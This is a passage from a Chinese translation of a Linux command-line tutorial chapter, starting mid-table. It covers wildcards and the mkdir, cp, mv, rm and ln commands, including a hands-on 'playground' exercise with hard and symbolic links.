</tr>
<tr>
<td>[:lower:]</td>
<td>匹配任意小写字母</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>匹配任意大写字母</td>
</tr>
</tbody></table>
<p>使用通配符使得构建文件名的复杂选择标准成为可能。表 4-3 提供了一些模式示例以及它们匹配的内容。</p>
<p><em>Table 4-3: 通配符示例</em></p>
<table>
<thead>
<tr>
<th><strong>模式</strong></th>
<th><strong>匹配</strong></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>所有文件</td>
</tr>
<tr>
<td>g*</td>
<td>以“g”开头的任何文件</td>
</tr>
<tr>
<td>b*.txt</td>
<td>以“b”开头，后面可以是任意字符，以“.txt”结尾的任何文件</td>
</tr>
</tbody></table>
<p>通配符</p>
<table>
<thead>
<tr>
<th>Data???</th>
<th>以“Data”开头，后面跟着正好三个字符的任何文件</th>
</tr>
</thead>
<tbody><tr>
<td>[abc]*</td>
<td>以“a”、“b”或“c”开头的任何文件</td>
</tr>
<tr>
<td>BACKUP.[0-9][0-9][0-9]</td>
<td>以“BACKUP.”开头，后面跟着正好三个数字的任何文件</td>
</tr>
<tr>
<td>[[:upper:]]*</td>
<td>以大写字母开头的任何文件</td>
</tr>
<tr>
<td>[![:digit:]]*</td>
<td>不以数字开头的任何文件</td>
</tr>
<tr>
<td>*[[:lower:]123]</td>
<td>以小写字母或数字“1”、“2”或“3”结尾的任何文件</td>
</tr>
</tbody></table>
<p>通配符可以与任何接受文件名作为参数的命令一起使用，但我们将在第 7 章“看待 Shell 所看到的世界”中更多地讨论这个话题。</p>
<h3 id="字符范围"><a href="#字符范围" class="headerlink" title="字符范围"></a>字符范围</h3><p>如果您来自其他类Unix环境，或者已经阅读了关于这个主题的其他书籍，您可能已经遇到了 [A-Z] 和 [az] 字符范围表示法。这些是传统的Unix表示法，在较早版本的Linux中也有效。它们仍然可以工作，但您必须小心使用它们，因为除非正确配置，否则它们将无法产生预期的结果。目前，您应该避免使用它们，而改用字符类。</p>
<h3 id="通配符在图形界面中也起作用"><a href="#通配符在图形界面中也起作用" class="headerlink" title="通配符在图形界面中也起作用"></a>通配符在图形界面中也起作用</h3><p>通配符之所以如此有价值，不仅因为它们在命令行中经常使用，而且因为一些图形文件管理器也支持它们。</p>
<ul>
<li><p>在 Nautilus（GNOME 的文件管理器）中，您可以使用 Edit&#x2F;Select Pattern 菜单项选择文件。只需使用通配符输入文件选择模式，当前查看的目录中的文件将突出显示以进行选择。</p>
</li>
<li><p>在 Dolphin 和 Konqueror 的某些版本中（它们是 KDE 的文件管理器），您可以直接在位置栏中输入通配符。例如，如果要查看 &#x2F;usr&#x2F;bin 目录中以小写字母“u”开头的所有文件，请在位置栏中输入“&#x2F;usr&#x2F;bin&#x2F;u*”它将显示结果。</p>
</li>
</ul>
<p>许多最初在命令行界面中发现的想法也会进入图形界面。这正是使Linux桌面变得如此强大的众多因素之一。</p>
<h3 id="mkdir-–-创建目录"><a href="#mkdir-–-创建目录" class="headerlink" title="mkdir – 创建目录"></a>mkdir – 创建目录</h3><p><code>mkdir</code> 命令用于创建目录。它的使用方式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> 目录...</span><br></pre></td></tr></table></figure>

<p><strong>关于表示法的说明：</strong> 当命令的描述中的一个参数后面跟着三个点时（如上所示），这意味着该参数可以重复使用，因此以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dir1</span><br></pre></td></tr></table></figure>

<p>将创建一个名为 dir1 的目录，而以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dir1 dir2 dir3</span><br></pre></td></tr></table></figure>

<p>将创建三个目录，分别命名为 dir1、dir2 和 dir3。</p>
<h3 id="cp-–-复制文件和目录"><a href="#cp-–-复制文件和目录" class="headerlink" title="cp – 复制文件和目录"></a>cp – 复制文件和目录</h3><p><code>cp</code> 命令用于复制文件或目录。它可以以两种不同的方式使用。第一种方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> 项目1 项目2</span><br></pre></td></tr></table></figure>

<p>将单个文件或目录 <code>项目1</code> 复制到文件或目录 <code>项目2</code> 中；第二种方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> 项目... 目录</span><br></pre></td></tr></table></figure>

<p>将多个项目（文件或目录）复制到目录中。</p>
<h4 id="有用的选项和示例"><a href="#有用的选项和示例" class="headerlink" title="有用的选项和示例"></a>有用的选项和示例</h4><p>表 4-4 列出了一些 <code>cp</code> 常用的选项。</p>
<p><em>表 4-4:</em> <em>cp 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>–archive</td>
<td>复制文件和目录以及它们的所有属性，包括所有权和权限。通常，副本将采用执行复制操作的用户的默认属性。我们将在第 9 章“权限”中查看文件权限。</td>
</tr>
<tr>
<td>-i</td>
<td>–interactive</td>
<td>在覆盖现有文件之前，提示用户确认。<strong>如果未指定此选项，<code>cp</code> 将在不提醒的情况下（即不会有警告）覆盖文件。</strong></td>
</tr>
<tr>
<td>-r</td>
<td>–recursive</td>
<td>递归复制目录及其内容。复制目录时，需要此选项（或 <code>-a</code> 选项）。</td>
</tr>
<tr>
<td>-u</td>
<td>–update</td>
<td>在从一个目录复制文件到另一个目录时，仅复制不存在或比目标目录中的现有对应文件更新的文件。在复制大量文件时很有用，因为它会跳过不需要复制的文件。</td>
</tr>
<tr>
<td>-v</td>
<td>–verbose</td>
<td>在执行复制时显示信息。</td>
</tr>
</tbody></table>
<p><em>表 4-5:</em> <em>cp 示例</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>cp 文件1 文件2</code></td>
<td>将 <code>文件1</code> 复制到 <code>文件2</code>。**如果 <code>文件2</code> 存在，则其内容将被覆盖为 <code>文件1</code> 的内容。**如果 <code>文件2</code> 不存在，将创建它。</td>
</tr>
<tr>
<td><code>cp -i 文件1 文件2</code></td>
<td>与上一个命令相同，除了如果 <code>文件2</code> 存在，则在覆盖它之前会提示用户。</td>
</tr>
<tr>
<td><code>cp 文件1 文件2 目录1</code></td>
<td>将 <code>文件1</code> 和 <code>文件2</code> 复制到目录 <code>目录1</code>。目录 <code>目录1</code> 必须已经存在。</td>
</tr>
<tr>
<td><code>cp 目录1/* 目录2</code></td>
<td>使用通配符，将 <code>目录1</code> 中的所有文件复制到 <code>目录2</code>。目录 <code>目录2</code> 必须已经存在。</td>
</tr>
<tr>
<td><code>cp -r 目录1 目录2</code></td>
<td>将目录 <code>目录1</code> 的内容复制到目录 <code>目录2</code>。如果目录 <code>目录2</code> 不存在，将创建它，并在复制后，它将包含与目录 <code>目录1</code> 相同的内容。如果目录 <code>目录2</code> 已经存在，则目录 <code>目录1</code>（及其内容）将被复制到 <code>目录2</code> 中。</td>
</tr>
</tbody></table>
<h5 id="mv-–-移动和重命名文件"><a href="#mv-–-移动和重命名文件" class="headerlink" title="mv – 移动和重命名文件"></a><strong>mv – 移动和重命名文件</strong></h5><p><code>mv</code> 命令既可以执行文件移动，也可以执行文件重命名，具体取决于它的使用方式。在任何一种情况下，操作完成后原始文件名不再存在。<code>mv</code> 的使用方式与 <code>cp</code> 类似，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 项目1 项目2</span><br></pre></td></tr></table></figure>

<p>将文件或目录 <code>项目1</code> 移动或重命名为 <code>项目2</code>，或者：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 项目... 目录</span><br></pre></td></tr></table></figure>

<p>将一个或多个项目从一个目录移动到另一个目录。</p>
<h4 id="有用的选项和示例-1"><a href="#有用的选项和示例-1" class="headerlink" title="有用的选项和示例"></a>有用的选项和示例</h4><p><code>mv</code> 具有与 <code>cp</code> 相似的选项，如表 4-6 中所述。</p>
<p><em>表 4-6:</em> <em>mv 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>–interactive</td>
<td>在覆盖现有文件之前，提示用户确认。<strong>如果未指定此选项，<code>mv</code> 将在不提醒的情况下覆盖文件。</strong></td>
</tr>
<tr>
<td>-u</td>
<td>–update</td>
<td>在从一个目录移动文件到另一个目录时，仅移动那些不存在或比目标目录中现有对应文件更新的文件。</td>
</tr>
<tr>
<td>-v</td>
<td>–verbose</td>
<td>在执行移动时显示信息。</td>
</tr>
</tbody></table>
<p>表 4-7 提供了一些 <code>mv</code> 使用的示例。<em>表 4-7:</em> <em>mv 示例</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>mv 文件1 文件2</code></td>
<td>将 <code>文件1</code> 移动到 <code>文件2</code>。**如果 <code>文件2</code> 存在，则其内容将被覆盖为 <code>文件1</code> 的内容。**如果 <code>文件2</code> 不存在，将创建它。<strong>在任一情况下，<code>文件1</code> 将不复存在。</strong></td>
</tr>
<tr>
<td><code>mv -i 文件1 文件2</code></td>
<td>与上一个命令相同，除了如果 <code>文件2</code> 存在，则在覆盖它之前会提示用户。</td>
</tr>
<tr>
<td><code>mv 文件1 文件2 目录1</code></td>
<td>将 <code>文件1</code> 和 <code>文件2</code> 移动到目录 <code>目录1</code>。目录 <code>目录1</code> 必须已经存在。</td>
</tr>
<tr>
<td><code>mv 目录1 目录2</code></td>
<td>如果目录 <code>目录2</code> 不存在，则创建目录 <code>目录2</code>，并将目录 <code>目录1</code> 的内容移动到 <code>目录2</code> 中，然后删除目录 <code>目录1</code>。如果目录 <code>目录2</code> 已经存在，则将目录 <code>目录1</code>（及其内容）移动到目录 <code>目录2</code> 中。</td>
</tr>
</tbody></table>
<h3 id="rm-–-删除文件和目录"><a href="#rm-–-删除文件和目录" class="headerlink" title="rm – 删除文件和目录"></a>rm – 删除文件和目录</h3><p><code>rm</code> 命令用于删除（删除）文件和目录，如下所示：</p>
<p><strong>rm *项目*…</strong></p>
<p>其中 <code>项目</code> 是一个或多个文件或目录。</p>
<h4 id="有用的选项和示例-2"><a href="#有用的选项和示例-2" class="headerlink" title="有用的选项和示例"></a>有用的选项和示例</h4><p>表 4-8 描述了 <code>rm</code> 的一些常用选项。</p>
<p><em>表 4-8:</em> <em>rm 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>–interactive</td>
<td>在删除现有文件之前，提示用户确认。<strong>如果未指定此选项，<code>rm</code> 将在不提醒的情况下删除文件。</strong></td>
</tr>
<tr>
<td>-r</td>
<td>–recursive</td>
<td>递归删除目录。这意味着如果要删除的目录有子目录，则也会将它们删除。要删除目录，必须指定此选项。</td>
</tr>
<tr>
<td>-f</td>
<td>–force</td>
<td>忽略不存在的文件，不提示。这会覆盖 –interactive 选项。</td>
</tr>
<tr>
<td>-v</td>
<td>–verbose</td>
<td>在执行删除时显示信息。</td>
</tr>
</tbody></table>
<p>表 4-9 提供了一些使用 <code>rm</code> 命令的示例。</p>
<p><em>表 4-9:</em> <em>rm 示例</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>rm 文件1</code></td>
<td>静默删除 <code>文件1</code>。</td>
</tr>
<tr>
<td><code>rm -i 文件1</code></td>
<td>与上一个命令相同，只是在执行删除之前会提示用户确认。</td>
</tr>
<tr>
<td><code>rm -r 文件1 目录1</code></td>
<td>删除 <code>文件1</code>、<code>目录1</code> 及其内容。</td>
</tr>
<tr>
<td><code>rm -rf 文件1 目录1</code></td>
<td>与上一个命令相同，只是如果 <code>文件1</code> 或 <code>目录1</code> 不存在，<code>rm</code> 将继续静默执行。</td>
</tr>
</tbody></table>
<p><strong>小心使用 <code>rm</code>！</strong></p>
<p>类 Unix 操作系统，如 Linux，没有撤销命令。一旦使用 <code>rm</code> 删除了某些内容，它就彻底丢失了。Linux 假设您很聪明，知道自己在做什么。</p>
<p>特别小心使用通配符。考虑以下经典示例。假设您只想删除目录中的 HTML 文件。为此，您键入以下命令：</p>
<p><code>rm *.html</code></p>
<p>这是正确的，但如果您在 <code>*</code> 和 <code>.html</code> 之间意外放置了一个空格，如下所示：</p>
<p><code>rm * .html</code></p>
<p><code>rm</code> 命令将删除目录中的所有文件，然后抱怨没有名为 <code>.html</code> 的文件。</p>
<p><strong>这是一个有用的提示：</strong> 每当您在 <code>rm</code> 中使用通配符时（除了仔细检查输入！），先用 <code>ls</code> 测试通配符。这将允许您查看将被删除的文件。然后按上箭头键调回命令，并将 <code>ls</code> 替换为 <code>rm</code>。</p>
<h3 id="ln-–-创建链接"><a href="#ln-–-创建链接" class="headerlink" title="ln – 创建链接"></a>ln – 创建链接</h3><p><code>ln</code> 命令用于创建硬链接或符号链接。它有两种用法。以下是创建硬链接的方式：</p>
<p><strong>ln *文件* *链接*</strong></p>
<p>以下是创建符号链接的方式：</p>
<p><strong>ln -s *项目* *链接*</strong></p>
<p>其中 <code>项目</code> 可以是文件或目录，用于创建符号链接。</p>
<h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>硬链接是创建链接的最初 Unix 方法，与符号链接相比，后者更为现代。默认情况下，每个文件都有一个硬链接，为文件赋予其名称。当我们创建硬链接时，我们为文件创建了一个额外的目录条目。硬链接有两个重要的限制：</p>
<ol>
<li>硬链接不能引用其自己文件系统之外的文件。这意味着链接不能引用与链接本身不在同一磁盘分区上的文件。</li>
<li>硬链接不能引用目录。</li>
</ol>
<p>硬链接与文件本身无法区分。与符号链接不同，当我们列出包含硬链接的目录时，我们将看不到链接的任何特殊指示。当删除硬链接时，链接被删除，但文件本身的内容继续存在（即，其空间不会被释放），直到删除对文件的所有链接为止。</p>
<p>了解硬链接很重要，因为您可能会不时地遇到它们，但现代实践更喜欢符号链接，我们将在下一节中介绍。</p>
<h4 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h4><p>符号链接是为了克服硬链接的限制而创建的。符号链接通过创建一种包含对所引用文件或目录的文本指针的特殊文件来工作。在这方面，它们的操作方式与 Windows 的快捷方式非常相似，尽管它们在很多年前就存在了 Windows 功能。</p>
<p>由符号链接指向的文件以及符号链接本身在很大程度上是无法区分的。例如，如果我们向符号链接写入内容，则会写入所引用的文件。但是当我们删除符号链接时，只删除链接本身，而不删除文件本身。如果在删除符号链接之前删除文件，链接将继续存在，但将不再指向任何内容。在这种情况下，链接被称为<em>损坏</em>。在许多实现中，<code>ls</code> 命令会以区分颜色（例如红色）显示损坏的链接，以显示它们的存在。</p>
<p>链接的概念可能看起来令人困惑，但请坚持。我们将尝试所有这些内容，希望它会变得清晰。</p>
<h3 id="让我们建立一个游乐场"><a href="#让我们建立一个游乐场" class="headerlink" title="让我们建立一个游乐场"></a>让我们建立一个游乐场</h3><p>由于我们将进行一些真正的文件操作，让我们建立一个安全的地方，用于“玩耍”我们的文件操作命令。首先，我们需要一个要工作的目录。我们将在我们的主目录中创建一个目录，并将其命名为 <code>playground</code>。</p>
<h4 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h4><p><code>mkdir</code> 命令用于创建目录。为了创建我们的 <code>playground</code> 目录，我们首先确保我们在我们的主目录中，然后创建新目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span></span><br><span class="line"></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> playground</span><br></pre></td></tr></table></figure>

<p>为了使我们的游乐场更有趣，让我们在其中创建两个名为 <code>dir1</code> 和 <code>dir2</code> 的目录。为此，我们将当前工作目录更改为 <code>playground</code>，然后执行另一个 <code>mkdir</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> playground</span><br><span class="line"></span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">mkdir</span> dir1 dir2</span><br></pre></td></tr></table></figure>

<p>请注意，<code>mkdir</code> 命令将接受多个参数，允许我们使用单个命令创建两个目录。</p>
<h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><p>接下来，让我们将一些数据放入我们的游乐场。我们将使用 <code>cp</code> 命令，将 <code>/etc</code> 目录中的 <code>passwd</code> 文件复制到当前工作目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">cp</span> /etc/passwd .</span><br></pre></td></tr></table></figure>

<p>请注意我们使用了当前工作目录的缩写，即单个句点。现在，如果执行 <code>ls</code>，我们将看到我们的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 me me 4096 2018-01-10 16:40 dir1</span><br><span class="line">drwxrwxr-x 2 me me 4096 2018-01-10 16:40 dir2</span><br><span class="line">-rw-r--r-- 1 me me 1650 2018-01-10 16:07 passwd</span><br></pre></td></tr></table></figure>

<p>现在，只是为了好玩，让我们使用 “-v” 选项（详细信息）再次复制文件，以查看它的操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">cp</span> -v /etc/passwd .</span><br><span class="line">`/etc/passwd<span class="string">&#x27; -&gt; `./passwd&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>cp</code> 命令再次执行了复制操作，但这次显示了一个简洁的消息，指示它正在执行的操作。请注意，<code>cp</code> 覆盖了第一次复制而没有任何警告。再次说明了 <code>cp</code> 假设我们知道自己在做什么。为了获得警告，我们将包含 “-i”（交互式）选项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">cp</span> -i /etc/passwd .</span><br><span class="line"><span class="built_in">cp</span>: overwrite `./passwd<span class="string">&#x27;?</span></span><br></pre></td></tr></table></figure>

<p>通过输入 <code>y</code> 来响应提示，将导致文件被覆盖，输入其他字符（例如，n）将导致 <code>cp</code> 保持文件不变。</p>
<h4 id="移动和重命名文件"><a href="#移动和重命名文件" class="headerlink" title="移动和重命名文件"></a>移动和重命名文件</h4><p>现在，<code>passwd</code> 这个名字似乎不太好玩，而且这是一个游乐场，所以让我们将其更改为其他名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> passwd fun</span><br></pre></td></tr></table></figure>

<p>让我们通过将我们重命名的文件移到每个目录，然后再次移回当前工作目录，来一起玩乐一下。以下是将其首先移动到目录 <code>dir1</code> 的步骤：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> fun dir1</span><br></pre></td></tr></table></figure>

<p>接下来，将其从 <code>dir1</code> 移动到 <code>dir2</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> dir1/fun dir2</span><br></pre></td></tr></table></figure>

<p>最后，将其移回当前工作目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> dir2/fun .</span><br></pre></td></tr></table></figure>

<p>接下来，让我们看看 <code>mv</code> 对目录的影响。首先，我们将我们的数据文件再次移动到 <code>dir1</code> 中，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> fun dir1</span><br></pre></td></tr></table></figure>

<p>然后，我们将 <code>dir1</code> 移动到 <code>dir2</code> 中，并使用 <code>ls</code> 进行确认。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> dir1 dir2</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l dir2</span><br><span class="line">total 4</span><br><span class="line">drwxrwxr-x 2 me me  4096 2018-01-11 06:06 dir1</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l dir2/dir1</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 me me  1650 2018-01-10 16:33 fun</span><br></pre></td></tr></table></figure>

<p>请注意，由于 <code>dir2</code> 已经存在，<code>mv</code> 将 <code>dir1</code> 移动到 <code>dir2</code> 中。如果 <code>dir2</code> 不存在，<code>mv</code> 将会将 <code>dir1</code> 重命名为 <code>dir2</code>。最后，让我们将所有内容都放回去。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> dir2/dir1 .</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">mv</span> dir1/fun .</span><br></pre></td></tr></table></figure>

<h4 id="创建硬链接"><a href="#创建硬链接" class="headerlink" title="创建硬链接"></a>创建硬链接</h4><p>现在我们来尝试一些链接。我们首先将一些硬链接创建到我们的数据文件，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> fun fun-hard</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> fun dir1/fun-hard</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> fun dir2/fun-hard</span><br></pre></td></tr></table></figure>

<p>现在我们有了文件 <code>fun</code> 的四个实例。让我们看一下我们的游乐场目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 16</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-14 16:17 dir1</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-14 16:17 dir2</span><br><span class="line">-rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun</span><br><span class="line">-rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun-hard</span><br></pre></td></tr></table></figure>

<p>我们注意到的一件事是，<code>ls</code> 列表中 <code>fun</code> 和 <code>fun-hard</code> 的第二个字段都包含一个数字 4，这是现在为该文件存在的硬链接数量。请记住，文件始终至少有一个链接，因为文件的名称是由链接创建的。那么，我们怎么知道 <code>fun</code> 和 <code>fun-hard</code> 实际上是同一个文件呢？在这种情况下，<code>ls</code> 并不是非常有用。虽然我们可以看到 <code>fun</code> 和 <code>fun-hard</code> 的大小相同（字段 5），但我们的列表没有提供确切的方法。为了解决这个问题，我们需要深入一点。</p>
<p>在考虑硬链接时，将文件想象成由两个部分组成是有帮助的。</p>
<ol>
<li>包含文件内容的数据部分。</li>
<li>保存文件名称的名称部分。</li>
</ol>
<p>当我们创建硬链接时，实际上是创建了指向相同数据部分的附加名称部分。系统为被称为 <em>inode</em> 的一系列磁盘块分配了一个链，然后将其与名称部分关联。因此，每个硬链接都引用包含文件内容的特定 inode。</p>
<p><code>ls</code> 命令有一种方法可以显示这些信息。可以使用 <code>-i</code> 选项调用它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -li</span><br><span class="line">total 16</span><br><span class="line">12353539 drwxrwxr-x 2 me  me  4096 2018-01-14 16:17 dir1</span><br><span class="line">12353540 drwxrwxr-x 2 me  me  4096 2018-01-14 16:17 dir2</span><br><span class="line">12353538 -rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun</span><br><span class="line">12353538 -rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun-hard</span><br></pre></td></tr></table></figure>

<p>在这个列表的版本中，第一个字段是 inode 编号，正如我们所看到的，<code>fun</code> 和 <code>fun-hard</code> 共享相同的 inode 编号，这证实了它们是同一个文件。</p>
<h4 id="创建符号链接"><a href="#创建符号链接" class="headerlink" title="创建符号链接"></a>创建符号链接</h4><p>符号链接是为了克服硬链接的两个缺点而创建的。</p>
<ol>
<li>硬链接不能跨越物理设备。</li>
<li>硬链接不能引用目录，只能引用文件。</li>
</ol>
<p>符号链接是一种特殊类型的文件，其中包含对目标文件或目录的文本指针。</p>
<p>创建符号链接与创建硬链接类似。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> -s fun fun-sym</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> -s ../fun dir1/fun-sym</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> -s ../fun dir2/fun-sym</span><br></pre></td></tr></table></figure>

<p>第一个示例非常简单；我们只需添加 “-s” 选项以创建符号链接而不是硬链接。但是接下来两个呢？记住，当我们创建符号链接时，我们实际上是在相对于符号链接的位置创建目标文件的文本描述。如果我们查看此处显示的 <code>ls</code> 输出，情况就更容易理解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l dir1</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun-hard </span><br><span class="line">lrwxrwxrwx 1 me  me     6 2018-01-15 15:17 fun-sym -&gt; ../fun</span><br></pre></td></tr></table></figure>

<p>在 dir1 中，fun-sym 的列表显示它是一个符号链接，由第一个字段中的前导 l 表示，并且它指向 ..&#x2F;fun，这是正确的。相对于 fun-sym 的位置，fun 位于其上一级目录。还要注意，符号链接文件的长度为 6，即字符串 ..&#x2F;fun 的字符数，而不是它所指向的文件的长度。</p>
<p>在创建符号链接时，我们可以使用绝对路径名，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> -s /home/me/playground/fun dir1/fun-sym</span><br></pre></td></tr></table></figure>

<p>或者使用相对路径名，就像我们在之前的示例中所做的那样。在大多数情况下，使用相对路径名更为可取，因为它允许重命名和&#x2F;或移动包含符号链接及其引用文件的目录树，而不会破坏链接。</p>
<p>除了常规文件之外，符号链接还可以引用目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ln</span> -s dir1 dir1-sym</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 16</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir1 </span><br><span class="line">lrwxrwxrwx 1 me  me     4 2018-01-16 14:45 dir1-sym -&gt; dir1 </span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir2 </span><br><span class="line">-rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun</span><br><span class="line">-rw-r--r-- 4 me  me  1650 2018-01-10 16:33 fun-hard </span><br><span class="line">lrwxrwxrwx 1 me  me     3 2018-01-15 15:15 fun-sym -&gt; fun</span><br></pre></td></tr></table></figure>

<h4 id="删除文件和目录"><a href="#删除文件和目录" class="headerlink" title="删除文件和目录"></a>删除文件和目录</h4><p>正如我们之前所讨论的，<code>rm</code> 命令用于删除文件和目录。我们将使用它来清理一下我们的练习空间。首先，让我们删除其中一个硬链接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">rm</span> fun-hard</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir1</span><br><span class="line">lrwxrwxrwx 1 me  me   4 2018-01-16 14:45 dir1-sym -&gt; dir1</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir2</span><br><span class="line">-rw-r--r-- 3 me  me  1650 2018-01-10 16:33 fun</span><br><span class="line">lrwxrwxrwx 1 me  me   3 2018-01-15 15:15 fun-sym -&gt; fun</span><br></pre></td></tr></table></figure>

<p>这按预期工作。文件 <code>fun-hard</code> 已经删除，而对于 <code>fun</code>，链接计数从四降到了三，如目录列表的第二个字段所示。接下来，我们将删除文件 <code>fun</code>，为了一些乐趣，我们将包括 <code>-i</code> 选项以显示其作用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">rm</span> -i fun</span><br><span class="line"><span class="built_in">rm</span>: remove regular file <span class="string">&#x27;fun&#x27;</span>?</span><br></pre></td></tr></table></figure>

<p>在提示处输入 <code>y</code>，文件就被删除了。但现在让我们看一下 <code>ls</code> 的输出。注意 <code>fun-sym</code> 发生了什么？由于它是一个符号链接，指向一个现在不存在的文件，该链接现在是<em>破损的</em>。</p>
